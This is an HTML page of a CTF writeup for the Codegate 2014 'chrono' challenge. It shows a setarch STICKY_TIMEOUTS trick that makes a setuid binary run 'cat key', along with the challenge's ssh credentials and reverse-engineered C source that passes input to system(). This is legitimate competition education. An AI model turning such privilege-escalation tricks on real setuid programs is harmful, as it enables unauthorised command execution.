@@ -1,0 +1,503 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Codegate CTF Quals 2014 chrono writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="Description ssh guest@58.229.183.16 / ExtremelyDangerousGuest Login, look around guest@codegate:~$ ls -al
+total 20
+dr-xr-x--- 2 guest guest 4096 Feb &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <div id="header-inner">
+    <span class="first"><a href="/">blue-lotus</a></span>
+    <span><a href="/about">about</a></span>
+    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
+  </div>
+</hgroup>
+
+</header>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Codegate CTF Quals 2014 Chrono Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Description</p>
+
+<pre><code>ssh guest@58.229.183.16 / ExtremelyDangerousGuest
+</code></pre>
+
+<p>Login, look around</p>
+
+<pre><code>guest@codegate:~$ ls -al
+total 20
+dr-xr-x--- 2 guest guest 4096 Feb 19 22:49 .
+drwxr-xr-x 4 root  root  4096 Feb 22 00:07 ..
+lrwxrwxrwx 1 root  root     9 Feb 19 22:22 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 root  root   220 Feb 19 22:21 .bash_logout
+-rw-r--r-- 1 guest guest 3637 Mar 31  2013 .bashrc
+-rw-r--r-- 1 guest guest  675 Mar 31  2013 .profile
+
+guest@codegate:~$ lsattr -a
+----i--------e-- ./.profile
+----i--------e-- ./.bash_logout
+-------------e-- ./..
+----i--------e-- ./.
+lsattr: Operation not supported While reading flags on ./.bash_history
+----i--------e-- ./.bashrc
+
+guest@codegate:/home/chrono$ ls -al
+total 924
+dr-xr-xr-x 2 chrono chrono   4096 Feb 19 22:24 .
+drwxr-xr-x 4 root   root     4096 Feb 22 00:07 ..
+lrwxrwxrwx 1 root   root        9 Feb 19 22:24 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 chrono chrono    220 Mar 31  2013 .bash_logout
+-rw-r--r-- 1 chrono chrono   3637 Mar 31  2013 .bashrc
+-rwsr-xr-x 1 chrono chrono 921576 Feb 19 22:13 chrono
+-r-------- 1 chrono chrono     28 Feb 22 00:07 key
+-rw-r--r-- 1 chrono chrono    675 Mar 31  2013 .profile
+
+guest@codegate:/home/chrono$ lsattr -a
+lsattr: Permission denied While reading flags on ./key
+----i--------e-- ./.profile
+----i--------e-- ./.bash_logout
+-------------e-- ./..
+----i--------e-- ./.
+lsattr: Operation not supported While reading flags on ./.bash_history
+----i--------e-- ./chrono
+----i--------e-- ./.bashrc
+</code></pre>
+
+<p>Nice security</p>
+
+<pre><code>guest@codegate:/home/chrono$ file chrono
+chrono: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x8c0628afc74aa0a346020da6d9bbd44bd90709a0, stripped
+</code></pre>
+
+<p>Stripped x86_64 binary</p>
+
+<p>To make it readable, feed the remote libc.a and libm.a to Flair, produce signature and apply in IDA</p>
+
+<p>Notice that the timeval struct provided by IDA has wrong size. Both tv_sec and tv_usec should be quad-word</p>
+
+<p>Read, read, read…</p>
+
+<p>The output depends on elapsed milliseconds during select. We have two options:</p>
+
+<ol>
+  <li>Solve the equation and controll the timing accurately</li>
+  <li>Keep timeout untouched, NaN save the world</li>
+</ol>
+
+<p>Read Linux source code <code>fs/select.c</code></p>
+
+<pre><code>SYSCALL_DEFINE5(select, int, n, fd_set __user *, inp, fd_set __user *, outp,
+                fd_set __user *, exp, struct timeval __user *, tvp)
+{
+    struct timespec end_time, *to = NULL;
+    struct timeval tv;
+    int ret;
+
+    if (tvp) {
+        if (copy_from_user(&amp;tv, tvp, sizeof(tv)))
+            return -EFAULT;
+
+        to = &amp;end_time;
+        if (poll_select_set_timeout(to,
+                tv.tv_sec + (tv.tv_usec / USEC_PER_SEC),
+                (tv.tv_usec % USEC_PER_SEC) * NSEC_PER_USEC))
+            return -EINVAL;
+    }
+
+    ret = core_sys_select(n, inp, outp, exp, to);
+    ret = poll_select_copy_remaining(&amp;end_time, tvp, 1, ret);
+
+    return ret;
+}
+</code></pre>
+
+<p>The timeval struct is updated in <code>poll_select_copy_remaining</code></p>
+
+<pre><code>static int poll_select_copy_remaining(struct timespec *end_time, void __user *p,
+                                      int timeval, int ret)
+{
+    struct timespec rts;
+    struct timeval rtv;
+
+    if (!p)
+        return ret;
+
+    if (current-&gt;personality &amp; STICKY_TIMEOUTS)
+        goto sticky;
+
+    ...
+    ...
+
+    /*
+     * If an application puts its timeval in read-only memory, we
+     * don't want the Linux-specific update to the timeval to
+     * cause a fault after the select has completed
+     * successfully. However, because we're not updating the
+     * timeval, we can't restart the system call.
+     */
+
+sticky:
+    if (ret == -ERESTARTNOHAND)
+        ret = -EINTR;
+    return ret;
+}
+</code></pre>
+
+<p>STICKY_TIMEOUTS sounds good. And one more important thing, STICKY_TIMEOUTS bit is not cleared for setuid exec. See Linux source code <code>include/uapi/linux/personality.h</code></p>
+
+<pre><code>/*
+ * Security-relevant compatibility flags that must be
+ * cleared upon setuid or setgid exec:
+ */
+#define PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC  | \
+                            ADDR_NO_RANDOMIZE  | \
+                            ADDR_COMPAT_LAYOUT | \
+                            MMAP_PAGE_ZERO)
+</code></pre>
+
+<p>So, how to change personality?</p>
+
+<pre><code>guest@codegate:/home/chrono$ setarch --help
+Usage: setarch &lt;arch&gt; [options] [program [program arguments]]
+
+Options:
+ -h, --help               displays this help text
+ -v, --verbose            says what options are being switched on
+ -R, --addr-no-randomize  disables randomization of the virtual address space
+ -F, --fdpic-funcptrs     makes function pointers point to descriptors
+ -Z, --mmap-page-zero     turns on MMAP_PAGE_ZERO
+ -L, --addr-compat-layout changes the way virtual memory is allocated
+ -X, --read-implies-exec  turns on READ_IMPLIES_EXEC
+ -B, --32bit              turns on ADDR_LIMIT_32BIT
+ -I, --short-inode        turns on SHORT_INODE
+ -S, --whole-seconds      turns on WHOLE_SECONDS
+ -T, --sticky-timeouts    turns on STICKY_TIMEOUTS
+ -3, --3gb                limits the used address space to a maximum of 3 GB
+     --4gb                ignored (for backward compatibility only)
+     --uname-2.6          turns on UNAME26
+
+For more information see setarch(8).
+</code></pre>
+
+<p>Give it a shot</p>
+
+<pre><code>guest@codegate:/home/chrono$ setarch x86_64 -T ./chrono
+cat key
+
+He said :
+    import zlib
+    zlib.compress(space)
+
+
+
+ o
+|+|
+ !
+[ ]
+
+
+
+
+voila!
+dIfF3rENT_L3VEL_s4me_aNsW3r
+</code></pre>
+
+<p>– EOF –</p>
+
+<pre><code>/*
+ * CodeGate 2014 - chrono 300 Point Logical
+ *
+ * Reverse Engineered by libmaru (libmaru#gmail.com)
+ *
+ * Build Environment:
+ *   Linux codegate 3.11.0-15-generic #25-Ubuntu SMP
+ *     Thu Jan 30 17:22:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+ *   gcc (Ubuntu/Linaro 4.8.1-10ubuntu9) 4.8.1
+ *
+ * Build Instruction:
+ *   gcc -static -fno-stack-protector -o chrono chrono.c -lm
+ *   strip chrono
+ *
+ * Produce identical binary except Build ID
+ *
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;math.h&gt;
+#include &lt;sys/select.h&gt;
+
+#define TIMEOUT     299792458
+#define PARAM       0.0030000000000000000625L
+#define IDEAL_SUM   6.6260690000000002087L
+#define PI          3.1415920000000001622L
+
+int main()
+{
+    long double remain = 0;
+    long double param = 0;
+    long double item = 0;
+    long double sum = 0;
+    struct timeval timeout;
+    fd_set readfds;
+    char buf[256] = {};
+    int x,y;
+    bool flag = 1;
+
+    timeout.tv_sec  = TIMEOUT / 1000000;
+    timeout.tv_usec = TIMEOUT % 1000000;
+
+    FD_ZERO( &amp;readfds );
+    FD_SET( 0, &amp;readfds );
+
+    if( select( 1, &amp;readfds, NULL, NULL, &amp;timeout ) &lt;= 0 )
+    {
+        puts( "no hack." );
+        exit( 0 );
+    }
+
+    remain = timeout.tv_sec * 1000000 + timeout.tv_usec;
+    puts( "\nHe said : \n\timport zlib\n\tzlib.compress(space)" );
+    param = ( TIMEOUT - remain ) * PARAM;
+
+    for( y = 10; y &gt;= 0; --y )
+    {
+        for( x = 0; x &lt;= 45; ++x )
+        {
+            item = sin( x/param + 4 ) + 5;
+            sum += item;
+
+            if( flag &amp;&amp; x &gt; 4 &amp;&amp; x == rint( param * PI ) &amp;&amp; rint( item ) == y-1 )
+                flag = 0, putchar('*');
+            else if( flag &amp;&amp; x == 45 &amp;&amp; y-1 == rint( item ) )
+                putchar('*');
+            else if( x &gt; 4 &amp;&amp; x &lt;= 45 &amp;&amp; rint( item ) == y )
+                putchar('#');
+            else if( x == 1 &amp;&amp; y == 7 )
+                putchar('o');
+            else if( x == 1 &amp;&amp; y == 6 )
+                putchar('+');
+            else if( x == 0 &amp;&amp; y == 6 )
+                putchar('|');
+            else if( x == 2 &amp;&amp; y == 6 )
+                putchar('|');
+            else if( x == 1 &amp;&amp; y == 5 )
+                putchar('!');
+            else if( x == 0 &amp;&amp; y == 4 )
+                putchar('[');
+            else if( x == 2 &amp;&amp; y == 4 )
+                putchar(']');
+            else
+                putchar(' ');
+        }
+        putchar('\n');
+    }
+
+    if( FD_ISSET( 0, &amp;readfds ) )
+    {
+        fgets( buf, sizeof buf - 1, stdin );
+        if( !( sum &gt; IDEAL_SUM ) &amp;&amp; !( sum &lt; IDEAL_SUM ) )
+        {
+            puts( "voila!" );
+            system( buf );
+        }
+    }
+
+    return 0;
+}
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">libmaru</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2014-02-25-codegate-ctf-quals-2014-automata-writeup/" title="Previous Post: Codegate CTF Quals 2014 Automata writeup">&laquo; Codegate CTF Quals 2014 Automata writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/" title="Next Post: Codegate CTF Quals 2014 Clone Technique writeup">Codegate CTF Quals 2014 Clone Technique writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/">Codegate CTF Quals 2014 Weirdshark Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/">Codegate CTF Quals 2014 Weird_snus Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/">Codegate CTF Quals 2014 Web Proxy Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/">Codegate CTF Quals 2014 Clone Technique Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/">Codegate CTF Quals 2014 Chrono Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'bluelotus';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup/';
+        var disqus_url = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
